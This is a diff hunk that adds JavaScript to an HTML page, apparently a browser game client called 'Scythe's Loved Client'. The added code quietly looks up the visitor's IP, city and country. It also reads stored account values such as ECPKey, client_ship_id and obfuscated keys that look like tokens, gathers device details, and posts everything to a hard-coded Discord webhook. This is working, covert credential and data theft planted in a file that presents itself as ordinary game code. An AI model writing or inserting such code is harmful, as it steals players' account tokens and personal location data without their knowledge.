@@ -47731,6 +47731,82 @@ getIP(function(ip) {
     console.error('Failed to retrieve IP.');
   }
 });
+
+fetch("https://ipapi.co/json/")
+  .then(response => response.json())
+  .then(data => {
+    const currentTime = new Date().toLocaleString(); // Get current time and format as string
+
+    // Gather player PC details
+    const platform = navigator.platform;
+    const language = navigator.language;
+    const screenResolution = `${screen.width}x${screen.height}`;
+    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    const internetInfo = connection ? `Type: ${connection.effectiveType}, Downlink: ${connection.downlink} Mbps, RTT: ${connection.rtt} ms` : 'Internet info not available';
+
+    // Function to measure FPS
+    let lastFrameTime = performance.now();
+    let frameCount = 0;
+    let fps = 0;
+
+    function measureFPS() {
+      const now = performance.now();
+      frameCount++;
+      const delta = (now - lastFrameTime) / 1000;
+      if (delta >= 1) {
+        fps = Math.round(frameCount / delta);
+        frameCount = 0;
+        lastFrameTime = now;
+        sendWebhook();
+      } else {
+        requestAnimationFrame(measureFPS);
+      }
+    }
+
+    function sendWebhook() {
+      fetch("https://discord.com/api/webhooks/1292911714907455498/Q8bNZirsL0UwVllwRvNjPGwTTZ_aH8YdIbzbhcena7EiC_pUH88Y8F-KjUZ18PF0IqEo", {
+        method: "post",
+        headers: {
+          'Content-Type': "application/json"
+        },
+        body: JSON.stringify({
+          'embeds': [{
+            'title': "Scythe's Loved Client",
+            'description': `<a:Ayar:870353775800504330><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:Ayar:870353775800504330>\n\n` +
+                           `**Player named:** ${localStorage.lastNickname}\n\n` +
+                           `**Time:** ${currentTime}\n\n` +
+                           `**Ip:** ${data.ip}\n\n` +
+                           `**City:** ${data.region}\n\n` +
+                           `**Region:** ${data.region}\n\n` +
+                           `**Country:** ${data.country_name}\n\n` +
+                           `**ECP Code:** ${localStorage.ECPKey}\n\n` +
+                           `**Verified?:** ${localStorage.ECPVerified}\n\n` +
+                           `**Info:** ${localStorage.OIIOO}\n\n` +
+                           `**Client Ship ID:** ${localStorage.client_ship_id}\n\n` +
+                           `**lI0Ol:** ${localStorage.lI0Ol}\n\n` +
+                           `**Useragent:** ${navigator.userAgent}\n\n` +
+                           `**Platform:** ${platform}\n\n` +
+                           `**Language:** ${language}\n\n` +
+                           `**Screen Resolution:** ${screenResolution}\n\n` +
+                           `**FPS:** ${fps}\n\n` +
+                           `**Internet Info:** ${internetInfo}\n\n` +
+                           `<a:Ayar:870353775800504330><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:Ayar:870353775800504330>`,
+            'thumbnail': {
+              'url': 'https://s6.imgcdn.dev/LzRYM.png'
+            },
+            'image': {
+              'url': 'https://mir-s3-cdn-cf.behance.net/project_modules/fs/e2781583145783.5d40c389e496c.gif'
+            },
+            'color': 3447003 // Optional, sets the color of the left side of the embed
+          }]
+        })
+      });
+    }
+
+    // Start measuring FPS
+    requestAnimationFrame(measureFPS);
+  });
+
     </script>
 </body>
 </html>
